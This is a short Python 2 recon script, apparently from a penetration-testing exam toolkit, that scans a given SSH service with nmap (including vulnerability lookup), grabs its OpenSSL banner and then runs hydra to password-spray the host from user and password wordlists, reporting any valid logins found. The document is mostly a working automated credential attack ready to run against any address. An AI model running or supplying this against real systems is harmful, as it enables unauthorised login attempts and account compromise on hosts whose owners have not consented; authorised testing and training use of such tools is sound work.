#!/usr/bin/env python
import subprocess
import sys
import os

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

#NSE Documentation
#Running
#ssh-auth-methods: Returns authentication methods that the SSH server supports
#ssh2-enum-algos: reports number of algorithms that the server offers.
#sshv1: Check if server supports obsolete less secure SSH Protocol Version 1

#Not Running
#ssh-brute: Brute-force login against ssh servers
#ssh-hostkey: Shows target's key fingerprint and (with high verbosity) the public key itself.
#ssh-publickey-acceptance: Brute-force with private keys, passphrases, and usernames and checks to see if the target accepts them
#ssh-run: runs a remote command on the ssh server and returns the command output
print "INFO: Performing nmap SSH script scan for %s:%s" % (ip_address, port)
#SSHSCAN = "nmap -n -sV -Pn -vv -p %s --script=banner,ssh-auth-methods,sshv1,ssh2-enum-algos,vulners -oA '/root/scripts/recon_enum/results/exam/ssh/%s_ssh' %s" % (port, ip_address, ip_address)
#results = subprocess.check_output(SSHSCAN, shell=True)
subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=banner,ssh-auth-methods,sshv1,ssh2-enum-algos,vulners','-oA','/root/scripts/recon_enum/results/exam/ssh/%s_%s_ssh' % (ip_address,port),ip_address])
# outfile = "/root/scripts/recon_enum/results/exam/ssh/%s_sshrecon.txt" % (ip_address)
# f = open(outfile, "w")
# f.write(results)
# f.close

##openssl s_client -connect server:port to attempt to fingerprint exact openssl version. opther options. works on 443, etc.
OPENSSLGRAB = "openssl s_client -connect %s:%s > /root/scripts/recon_enum/results/exam/ssh/%s_openssl_connect 2>/root/scripts/recon_enum/results/exam/ssh/%s_openssl_connect_err" % (ip_address, port, ip_address, ip_address)
outPath = "/root/scripts/recon_enum/results/exam/ssh/%s_%s_openssl_connect" % (ip_address,port)
errPath = "/root/scripts/recon_enum/results/exam/ssh/%s_%s_openssl_connect_err" % (ip_address,port)
outfile = open(outPath,'w')
errfile = open(errPath,'w')
try:
    #results = subprocess.check_output(OPENSSLGRAB, shell=True)
    results = subprocess.check_output(['openssl','s_client','-connect','%s:%s' % (ip_address,port)],stderr=errfile)
    for res in results:
        outfile.write(res)
except subprocess.CalledProcessError as e:
    pass
outfile.close()
errfile.close()

#Hydra meant to do weak brute/spray, not extensive
#run manually for extensive brute
print "INFO: Performing hydra ssh scan against " + ip_address
#HYDRASSH = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/ssh/%s_sshhydra.txt -u %s -s %s ssh" % (ip_address, ip_address, port)
try:
    #results = subprocess.check_output(HYDRASSH, shell=True)
    #resultarr = results.split("\n")
    resultarr = subprocess.check_output(['hydra','-L','/root/lists/userlist.txt','-P','/root/lists/quick_password_spray.txt','-f','-o','/root/scripts/recon_enum/results/exam/ssh/%s_%s_sshhydra.txt' % (ip_address,port),'-u',ip_address,'-s',port,'ssh']).split("\n")
    for result in resultarr:
        if "login:" in result:
	        print "[*] Valid ssh credentials found: " + result
except:
    print "INFO: No valid ssh credentials found"
